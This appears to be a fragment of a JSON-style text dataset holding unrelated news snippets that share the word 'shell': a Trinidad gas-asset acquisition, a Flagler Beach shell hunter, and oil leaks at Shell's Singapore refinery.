or by involvement in food chains\u2014limits their geographic distribution; for example, bivalves of the family Teredinidae (shipworms) are associated with wood. In general, cold-water regions support fewer species.",

(\"STCBL\"), is set to be acquired by Canadian oil and gas producer Touchstone Exploration for $23 million in cash from BG Overseas Holdings. The move aligns with Touchstone\u2019s ongoing natural gas projects and provides it access to world LNG (liquefied natural gas) prices for natural gas. Moreover, it expands the company\u2019s presence in the Herrera fairway.\n\nAn Insight Into SHEL\u2019s Deal\n\nThe acquisition of STCBL will give Touchstone a 65% working interest in the Central Block exploration and production license in Trinidad and Tobago. The remaining 35% interest in the central block will be held by Heritage Petroleum Company Ltd.\n\nThe agreement includes the acquisition of four wells of STCBL located in the Carapal Ridge, Baraka and Baraka East natural gas pools, producing a combination of natural gas and natural gas liquids.\n\nThe infrastructure to be acquired along with the assets will boost the processing capacity of natural gas in the Herrera fairway and also enable Touchstone to expand its natural gas exports while bolstering its local market supply.\n\nThe agreement also lays down the acquisition of three key gas marketing contracts held by STCBL. One of the contracts is for domestic sales and the other two are associated with the Atlantic LNG facility. This dual-market strategy ensures that Touchstone can capitalize on local and global gas prices.\n\nStrengthening Production and Infrastructure\n\nCurrent production levels of the Central Block include 18 MMcf/d (million cubic feet per day) of natural gas and 200 bbls/d (barrels per day) of natural gas liquids, translating to approximately 3,200 barrels of oil equivalent per day. The block\u2019s assets include an 80 MMcf/d gas processing facility and a network of pipelines. Touchstone plans to optimize the capacities of these facilities, pursue infill drilling and explore further prospects to maximize output. The acquisition will increase the company\u2019s net production by 2,080 boepd (barrels of oil equivalent per day) and improve its cash flow prospects.\n\nAcquisition Completion and Pending Approvals\n\nThe acquisition, effective from Jan. 1, 2025, is expected to close by the second quarter of 2025 after the companies secure necessary approvals from the Energy Ministry and other regulatory bodies. Touchstone is also in touch with its banks to raise the required financing for the deal.\n\nSHEL\u2019s Zacks Rank and Key Picks\n\nLondon-based Shell is one of the primary oil super-majors \u2014 a group of the U.S. and Europe-based big energy multinationals with operations that span almost every corner of the globe.

She had several buckets, a shovel, a sieve and a claw-like tool with her. Her dog, Coco, kept watch over her work.\n\nWilkinson wasn\u2019t looking for some long-lost pirate chest. She was looking for her own kind of treasure: shells, like conchs, shark eyes and scalloped flats.\n\n\u201cThose are really hard to find,\u201d she said of the flats.\n\nShe was digging, sifting and sorting shells into buckets, working against the tide, which steadily reclaims some of what dredgers removed from the ocean floor.\n\n\u201cI\u2019m sifting for certain shells where they dredged out here and dumped out here. Can\u2019t find them on top because the water takes them out,\u201d Wilkinson said.\n\nFlagler Beach Beach renourishment brings sands, shells\n\nThe beach renourishment project that brought tons of sand to Flagler Beach earlier this year also brought a bounty of shells. Dredges scooped up sand from the ocean bottom about 10 miles offshore and pumped it along a stretch of Flagler Beach \u2014 with that sand came the treasure trove of shells.\n\nThe sand renourishment project placed about 1.31 million cubic yards of sand on a stretch of Flagler Beach from about Gamble Rogers Memorial State Recreation Area to North Seventh Street.\n\nAnd shell hunters like Wilkinson followed.\n\nWilkinson makes the trip from Jacksonville to Flagler Beach whenever she has time to hunt for shells.\n\nTo put it simply: She digs shells.\n\n\u201cWhenever I\u2019m not shoveling at the barn I\u2019m out here playing in the sand. It just gives me a great, a great day,\u201d Wilkinson said. \u201cGod gave us all of this.\u201d\n\nWilkinson, who retired from construction industry, has a barn with some rescued horses and some cows and chickens she takes care of.\n\nShe usually digs 2 or 3 feet to find the shells.\n\nShe said she always fills the holes back up.\n\nAnd she leaves some of her finds on the beach for others to experience the fun of discovering a particularly pretty shell on the sand.\n\nWilkinson said she started shelling about two years ago with her sister-in-law, Maria Wilkinson. The women have slept in cars to save money on shelling trips.\n\nCoco, her 1-year-old Schnauzer, barked occasionally.\n\nNo dogs buried during dig\n\nWilkinson\u2019s digging sometimes draws attention. She said two police officers showed up this week when she was shoveling sand in Flagler Beach.\n\n\u201cSomeone called the law on me,\u201d Wilkinson said. \u201cThey said they got a call about someone burying their dog on the beach.\u201d\n\nCoco was fine. The pooch was waiting in the car with Wilkinson\u2019s husband when police arrived.\n\nShe said the officers were \u201cvery nice\u201d and she thanked them for checking to make sure no one was burying a dog.\n\nWilkinson said she has a large collection of shells at home. She said she sends shells to her relatives in Alabama.\n\nSaid Wilkinson: \u201cI give them to my grandkids, and I have some family in Alabama that don\u2019t get to come to Florida, so I\u2019ll send them a box full of shells and say \u2018Haha, I live in Florida, and you don\u2019t.\u201d",

            "content": "For the second time since October, the Shell refinery at Pulau Bukom, Singapore has sprung a leak. This time, a processing unit released oil products into the marine environment via its cooling water system.\n\nOn December 27, Shell told the Maritime and Port Authority of Singapore (MPA) and National Environment Agency (NEA) that it had shut down one of its oil processing units at the Shell Energy and Chemicals Park at Pulau Bukom because of a suspected leak. The unit in question produces diesel and other refined products, and it uses cooling water from the sea. Shell estimated that several tonnes of refined products reached the water via a cooling water discharge outlet in a confined channel.\n\nTo address the spill, the refinery deployed containment booms and sorbent booms, along with dispersant spray. It also turned on a built-in skimmer system that is permanently installed in the channel, and boomed off the channel inlet to prevent the spread of the spill to the open sea.\n\nThe MPA and Shell also dispatched response boats to clean up light sheening off Pulau Bukom using dispersants and absorbent booms. For now, the agency continues to monitor the area via drone surveillance and satellite imagery. As an extra precaution, absorbant booms were deployed on the popular beaches of Sentosa and at nearby Sisters' Islands Marine Park; however, no slicks have reached these areas so far, and there has been no interruption in public access.\n\nOn December 28, Shell confirmed that the leak was contained and that there was no more petroleum going into the cooling water discharge. The exact source of the leak is still under investigation.\n\n\n\nSingapore's NEA is investigating the release, and it said in a statement that it will take regulatory action if it discovers any noncompliance.\n\n\n\nThis leak was the second at the massive refinery complex in three months. A land-based slop pipeline between Bukom Island and Bukom Kecil sprung a leak on 20 October 2024. The effluent overtopped a holding area and about 30 tonnes of oil-water mixture entered the sea between the two islands; the spill was contained and was quickly cleaned up.\n\nShell Energy and Chemicals Park Singapore is the British company's largest wholly-owned refining complex. It has been in operation since 1961; Shell sold it to Glencore and Chandra Asri Capital earlier this year, but the transaction has not yet been finalized.",
